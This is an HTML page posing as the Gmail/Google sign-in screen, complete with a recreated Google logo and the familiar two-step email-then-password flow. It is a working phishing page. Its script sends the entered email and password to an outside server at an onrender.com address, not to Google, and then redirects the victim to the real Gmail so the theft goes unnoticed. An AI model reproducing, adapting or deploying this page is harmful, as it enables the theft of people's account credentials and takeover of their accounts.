<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Gmail - Sign in</title>
  <style>
    :root {
      --bg: #f5f7fb;
      --panel: #ffffff;
      --text: #202124;
      --muted: #5f6368;
      --border: #dadce0;
      --blue: #1a73e8;
      --blue-dark: #1558c0;
      --shadow: rgba(60, 64, 67, 0.14);
      --shadow-soft: rgba(60, 64, 67, 0.08);
      --error: #d93025;
      --success: #188038;
    }

    * {
      box-sizing: border-box;
      font-family: Arial, Helvetica, sans-serif;
    }

    html, body {
      margin: 0;
      min-height: 100%;
      background: var(--bg);
      color: var(--text);
    }

    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding: 20px 16px 0;
    }

    .page-shell {
      width: 100%;
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px 0 10px;
    }

    .panel {
      width: 100%;
      max-width: 448px;
      background: var(--panel);
      border-radius: 8px;
      box-shadow: 0 1px 2px var(--shadow-soft), 0 4px 18px var(--shadow);
      border: 1px solid rgba(218, 220, 224, 0.8);
      padding: 24px 40px 28px;
    }

    .logo-wrap {
      width: 48px;
      height: 48px;
      margin: 0 auto 18px;
    }

    .logo-wrap svg {
      display: block;
      width: 48px;
      height: 48px;
    }

    .view {
      display: none;
    }

    .view.active {
      display: block;
    }

    .title {
      margin: 0;
      font-size: 24px;
      line-height: 32px;
      font-weight: 400;
      letter-spacing: -0.01em;
      text-align: left;
    }

    .subtitle {
      margin: 8px 0 24px;
      font-size: 16px;
      line-height: 24px;
      color: var(--text);
      text-align: left;
    }

    .inline-note {
      margin: 0 0 20px;
      font-size: 14px;
      line-height: 20px;
      color: var(--muted);
      text-align: left;
    }

    .account-badge {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      width: auto;
      max-width: 100%;
      min-height: 36px;
      padding: 8px 14px 8px 10px;
      border: 1px solid var(--border);
      border-radius: 999px;
      background: #fff;
      color: var(--text);
      margin: 0 0 24px;
      cursor: pointer;
      transition: border-color 0.15s ease, box-shadow 0.15s ease;
      text-decoration: none;
    }

    .account-badge:hover {
      border-color: #c5c7c9;
      box-shadow: 0 1px 2px rgba(0,0,0,0.03);
    }

    .account-badge svg {
      width: 18px;
      height: 18px;
      flex-shrink: 0;
      color: #5f6368;
    }

    .badge-text {
      font-size: 14px;
      line-height: 20px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
      max-width: 270px;
    }

    .input-group {
      position: relative;
      margin-bottom: 6px;
    }

    .material-input {
      width: 100%;
      height: 56px;
      border: 1px solid var(--border);
      border-radius: 4px;
      padding: 20px 16px 6px;
      background: transparent;
      color: var(--text);
      font-size: 16px;
      line-height: 24px;
      outline: none;
      transition: border-color 0.15s ease, box-shadow 0.15s ease;
    }

    .material-input:focus {
      border: 2px solid var(--blue);
      box-shadow: 0 0 0 1px rgba(26,115,232,0.12);
      padding: 19px 15px 5px;
    }

    .material-input:focus ~ .input-label,
    .material-input:not(:placeholder-shown) ~ .input-label {
      top: 8px;
      left: 12px;
      font-size: 12px;
      line-height: 16px;
      color: var(--blue);
      background: #fff;
      padding: 0 4px;
    }

    .input-label {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 16px;
      line-height: 24px;
      color: var(--muted);
      background: transparent;
      pointer-events: none;
      transition: all 0.15s ease;
    }

    .helper-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 10px;
      min-height: 24px;
      margin-top: 6px;
      margin-bottom: 0;
    }

    .blue-link {
      color: var(--blue);
      text-decoration: none;
      font-size: 14px;
      line-height: 20px;
      font-weight: 500;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
    }

    .show-password {
      border: none;
      background: transparent;
      color: var(--blue);
      font-size: 14px;
      line-height: 20px;
      font-weight: 500;
      cursor: pointer;
      padding: 0;
      margin-left: auto;
    }

    .actions-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
      margin-top: 30px;
    }

    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      border: none;
      min-height: 36px;
      border-radius: 999px;
      font-size: 14px;
      line-height: 20px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.15s ease, box-shadow 0.15s ease, opacity 0.15s ease;
      padding: 0 24px;
    }

    .btn-secondary {
      background: transparent;
      color: var(--blue);
      padding-left: 0;
      padding-right: 0;
    }

    .btn-primary {
      background: var(--blue);
      color: #fff;
      min-width: 96px;
    }

    .btn-primary:hover {
      background: var(--blue-dark);
    }

    .btn-primary:disabled {
      opacity: 0.75;
      cursor: progress;
    }

    .status {
      min-height: 20px;
      margin-top: 16px;
      font-size: 13px;
      line-height: 20px;
      display: none;
    }

    .status.visible {
      display: block;
    }

    .status.error {
      color: var(--error);
    }

    .status.success {
      color: var(--success);
    }

    .footer {
      width: 100%;
      max-width: 448px;
      margin: 0 auto;
      padding: 12px 0 26px;
      color: var(--muted);
      font-size: 12px;
      line-height: 16px;
    }

    .lang-select {
      display: inline-block;
      color: #5f6368;
      padding: 6px 0;
    }

    .footer-links {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 14px;
      margin-top: 12px;
      flex-wrap: wrap;
    }

    .footer-links a {
      text-decoration: none;
      color: var(--muted);
    }

    @media (max-width: 540px) {
      .panel {
        padding-left: 24px;
        padding-right: 24px;
      }

      .actions-row {
        flex-wrap: wrap;
      }

      .btn-primary {
        margin-left: auto;
      }
    }
  </style>
</head>
<body>
  <div class="page-shell">
    <main class="panel" aria-label="Google Sign in panel">
      <div class="logo-wrap" aria-label="Google logo">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" role="img" aria-hidden="true">
          <defs>
            <mask id="google-g-mask">
              <rect width="512" height="512" fill="#000"/>
              <path fill="#fff" d="M492 256c0-16.5-1.5-32.5-4.2-48H256v92h132.5c-5.7 30.7-23 56.7-49.1 74.2v61.5h79.5c46.5-42.8 73.1-105.7 73.1-179.7zm-236 244c65.9 0 121.1-21.8 161.5-59.2l-79.5-61.5c-22.1 14.8-50.3 23.5-82 23.5-63.1 0-116.5-42.6-135.6-100H38.5v63.5C78.9 446.4 161.2 500 256 500zm-135.6-197.2c-4.8-14.8-7.6-30.5-7.6-46.8s2.8-32 7.6-46.8V145.7H38.5C22.2 178.2 13 216.1 13 256s9.2 77.8 25.5 110.3l81.9-63.5zm135.6-190.6c35.8 0 68 12.3 93.3 36.4l70-70C377.1 40.2 321.9 12 256 12 161.2 12 78.9 65.6 38.5 145.7l81.9 63.5c19.1-57.4 72.5-100 135.6-100z"/>
            </mask>
          </defs>
          <foreignObject width="512" height="512" mask="url(#google-g-mask)">
            <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;border-radius:50%;background:conic-gradient(from 0deg at 50% 50%,#4285F4 0deg 45deg,#EA4335 120deg,#FBBC05 200deg,#34A853 280deg,#4285F4 340deg 360deg);"></div>
          </foreignObject>
        </svg>
      </div>

      <form id="login-form" novalidate>
        <section id="email-view" class="view active" aria-hidden="false">
          <h1 class="title">Sign in</h1>
          <p class="subtitle">Use your Google Account</p>
          <p class="inline-note">To continue to Gmail</p>

          <button type="button" class="account-badge" aria-label="Select account">
            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.13 6-3.13s5.97 1.14 6 3.13c-1.29 1.94-3.5 3.22-6 3.22z"></path>
            </svg>
            <span id="emailBadge" class="badge-text">Email or phone</span>
          </button>

          <div class="input-group">
            <input type="text" id="emailInput" name="email" class="material-input" placeholder=" " required aria-label="Email or phone" />
            <label class="input-label" for="emailInput">Email or phone</label>
          </div>

          <div class="helper-row" style="margin-top: 18px; margin-bottom: 0;">
            <a href="#" class="blue-link">Forgot email?</a>
          </div>

          <div class="actions-row">
            <button type="button" class="btn btn-secondary">Create account</button>
            <button type="button" id="btn-email-next" class="btn btn-primary">Next</button>
          </div>
        </section>

        <section id="password-view" class="view" aria-hidden="true">
          <h1 class="title">Welcome</h1>

          <button type="button" class="account-badge" aria-label="Account badge">
            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.13 6-3.13s5.97 1.14 6 3.13c-1.29 1.94-3.5 3.22-6 3.22z"></path>
            </svg>
            <span id="userBadge" class="badge-text">User</span>
          </button>

          <div class="input-group">
            <input type="password" id="passwordInput" name="password" class="material-input" placeholder=" " required aria-label="Password" />
            <label class="input-label" for="passwordInput">Enter your password</label>
          </div>

          <div class="helper-row">
            <a href="#" class="blue-link">Forgot password?</a>
            <button type="button" id="password-toggle" class="show-password" aria-label="Show password">Show</button>
          </div>

          <div class="actions-row">
            <button type="button" id="btn-pass-back" class="btn btn-secondary">Back</button>
            <button type="submit" id="submit-button" class="btn btn-primary">Next</button>
          </div>
        </section>

        <div id="form-status" class="status" role="status" aria-live="polite"></div>
      </form>
    </main>
  </div>

  <footer class="footer">
    <div class="lang-select">English (United States)</div>
    <div class="footer-links">
      <a href="#">Help</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
    </div>
  </footer>

  <script>
    const emailView = document.getElementById('email-view');
    const passwordView = document.getElementById('password-view');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const emailBadge = document.getElementById('emailBadge');
    const userBadge = document.getElementById('userBadge');
    const btnEmailNext = document.getElementById('btn-email-next');
    const btnPassBack = document.getElementById('btn-pass-back');
    const btnSubmit = document.getElementById('submit-button');
    const form = document.getElementById('login-form');
    const statusBox = document.getElementById('form-status');
    const passwordToggle = document.getElementById('password-toggle');

    function showStatus(message, type = '') {
      statusBox.textContent = message || '';
      statusBox.className = 'status';
      if (message) {
        statusBox.classList.add(type, 'visible');
      }
    }

    function showView(viewName) {
      const emailActive = viewName === 'email';
      emailView.classList.toggle('active', emailActive);
      passwordView.classList.toggle('active', !emailActive);
      emailView.setAttribute('aria-hidden', String(!emailActive));
      passwordView.setAttribute('aria-hidden', String(emailActive));
    }

    function validateEmailOrPhone(value) {
      const trimmed = value.trim();
      if (!trimmed) return false;
      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phonePattern = /^\+?[0-9 ()-]{7,}$/;
      return emailPattern.test(trimmed) || phonePattern.test(trimmed);
    }

    function displayEmailValue(value) {
      const trimmed = value.trim();
      return trimmed.length > 32 ? `${trimmed.slice(0, 29)}...` : trimmed;
    }

    btnEmailNext.addEventListener('click', () => {
      const email = emailInput.value.trim();

      if (!email) {
        showStatus('Please enter an email address.', 'error');
        emailInput.focus();
        return;
      }

      if (!validateEmailOrPhone(email)) {
        showStatus('Enter a valid email address or phone number.', 'error');
        emailInput.focus();
        return;
      }

      emailBadge.textContent = displayEmailValue(email);
      userBadge.textContent = email;
      showStatus('', '');
      showView('password');
      passwordInput.focus();
    });

    btnPassBack.addEventListener('click', () => {
      showStatus('', '');
      showView('email');
      emailInput.focus();
    });

    passwordToggle.addEventListener('click', () => {
      const shouldShow = passwordInput.type === 'password';
      passwordInput.type = shouldShow ? 'text' : 'password';
      passwordToggle.textContent = shouldShow ? 'Hide' : 'Show';
      passwordToggle.setAttribute('aria-label', shouldShow ? 'Hide password' : 'Show password');
      passwordInput.focus();
    });

    form.addEventListener('submit', async (event) => {
      event.preventDefault();

      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();

      if (!email || !validateEmailOrPhone(email)) {
        showStatus('Please enter a valid email address before continuing.', 'error');
        showView('email');
        emailInput.focus();
        return;
      }

      if (!password) {
        showStatus('Please enter your password.', 'error');
        passwordInput.focus();
        return;
      }

      btnSubmit.disabled = true;
      btnSubmit.textContent = 'Signing in...';
      showStatus('Signing in...', '');

      const endpoint = 'https://my-backend-5mo9.onrender.com/submit';
      const payload = new URLSearchParams({ email, password });

      try {
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
          },
          body: payload.toString(),
          mode: 'cors',
          cache: 'no-store'
        });

        if (!response.ok) {
          throw new Error('Network request failed');
        }

        let result = {};
        try {
          result = await response.json();
        } catch (error) {
          result = {};
        }

        const redirectUrl = result.redirectUrl || 'https://mail.google.com/mail/u/0/';
        showStatus('Sign-in successful. Redirecting...', 'success');
        window.location.assign(redirectUrl);
      } catch (error) {
        console.error('Login failed:', error);
        showStatus('Unable to sign in right now. Please try again.', 'error');
      } finally {
        btnSubmit.disabled = false;
        btnSubmit.textContent = 'Next';
      }
    });
  </script>
</body>
</html>
